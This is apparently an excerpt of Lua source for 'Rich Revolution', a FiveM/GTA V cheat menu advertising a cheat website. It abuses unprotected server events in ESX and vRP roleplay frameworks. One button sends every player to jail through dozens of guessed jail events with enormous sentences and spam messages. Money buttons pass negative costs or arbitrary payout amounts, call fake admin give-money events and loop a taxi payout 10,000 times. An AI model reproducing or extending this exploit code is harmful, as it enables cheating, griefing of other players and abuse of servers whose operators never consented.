                    if RichRevolution.MenuButton('~g~→  ~s~' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if RichRevolution.MenuButton('~g~→  ~s~' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened('CarOptions') then
                if RichRevolution.Button('Spawn Infront Of You') then
				...
				elseif RichRevolution.Button('Spawn In It') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if RichRevolution.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened('MainTrailerSpa') then
                if RichRevolution.Button('Spawn Vehicle') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
            ...
            elseif RichRevolution.IsMenuOpened("MaliciousMenu") then
				...
				elseif RichRevolution.CheckBox(
					...
					then
				elseif RichRevolution.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif RichRevolution.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif RichRevolution.Button("Wall-in Legion Square") then
                ...
                then
                elseif RichRevolution.MenuButton('~g~→  ~s~ESP Menu', 'LulxDJ') then
				elseif RichRevolution.CheckBox(
			...
			then
                ...
                RichRevolution.Display()
			elseif RichRevolution.IsMenuOpened('LulxDJ') then
                if
                    RichRevolution.CheckBox(
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("ESXMenu") then
                if RichRevolution.MenuButton("~g~→  ~s~ESX Money Options", "ESXMoneyMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~ESX Job Menu", "ESXJobMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~ESX Boss", "ESXBossMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~ESX Drugs", "ESXDrugMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~ESX Misc", "ESXMiscMenu") then
                elseif RichRevolution.MenuButton("~g~→  ~s~ESX Jail", "ESXJailMenu") then
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("ESXMiscMenu") then
                if RichRevolution.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif RichRevolution.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif RichRevolution.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("ESXJailMenu") then
                if RichRevolution.Button("Send everyone to jail") then
                    TriggerServerEvent("route68jail:jailPlayerRoute68", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("wyspa_jail:addKartotekatrop", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 45 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer99", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent('ec49347f-474c-4b8e-a30d-9cc2476da5b3', GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-shit:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-jailmisd:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("wrp-fkucunt:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:*", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:eloelo90", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:wwiezienie", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("searp:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
                    TriggerServerEvent("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", -32432432423432432)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent('esx_jailer:wysylandoo', GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                    TriggerServerEvent("esx-jail:jailPlayer",   GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:jailhype", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9333397)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9333397)
                    TriggerServerEvent("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                    TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 500324532)
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 300)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                    ESX.ShowNotification("~p~Rich Revolution ~r~ " ..  GetPlayerServerId(i) .. "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("wysparp_tablet:SendMessage", GetPlayerServerId(i), 9999999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1337)
                    TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                    TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                    TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                    TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                    TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                            TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                            TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                            TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                            TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9995345349999999)
                            TriggerServerEvent("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9995345349999999)
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9995345349999999)
                            TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9995345349999999)
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                            TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                            TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                            TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
                            TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                            TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                            TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1,2137)
                            TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                            TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 99953)
                            TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999)
                            TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 100 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 999)
                            TriggerServerEvent("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 111)
                            TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                        end
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("ESXDrugMenu") then
                if RichRevolution.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif RichRevolution.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif RichRevolution.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif RichRevolution.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif RichRevolution.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif RichRevolution.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif RichRevolution.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif RichRevolution.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif RichRevolution.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif RichRevolution.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif RichRevolution.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif RichRevolution.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif RichRevolution.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif RichRevolution.Button("Stop all (Drugs)") then
...
-- 4x482
            ...
            elseif RichRevolution.IsMenuOpened("VRPJailMenu") then
                ...
                RichRevolution.Display()
                        elseif RichRevolution.IsMenuOpened("VRPMoneyMenu") then
                if RichRevolution.Button("-» Ultimate moneymaker «-") then
            ...
            elseif RichRevolution.Button("VRP PayGarage 100$") then
                TriggerServerEvent("lscustoms:payGarage", {costs = -100})
            elseif RichRevolution.Button("VRP PayGarage 1000$") then
                TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
            elseif RichRevolution.Button("VRP PayGarage 10 000$") then
                TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
            elseif RichRevolution.Button("VRP PayGarage 100 000$") then
                TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
			elseif RichRevolution.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif RichRevolution.Button("Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif RichRevolution.Button("Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif RichRevolution.Button("Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif RichRevolution.Button("Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif RichRevolution.Button("Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif RichRevolution.Button("Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif RichRevolution.Button(" LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif RichRevolution.Button("Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif RichRevolution.Button("Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif RichRevolution.Button("Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif RichRevolution.Button("Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif RichRevolution.Button("Taxijob 10.000x $") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif RichRevolution.Button("Pilot & Taxi (~b~VRP~s~) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif RichRevolution.Button("Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif RichRevolution.Button("Paycheck $") then
                ...
                RichRevolution.Display()
                        elseif RichRevolution.IsMenuOpened("ESXMoneyMenu") then
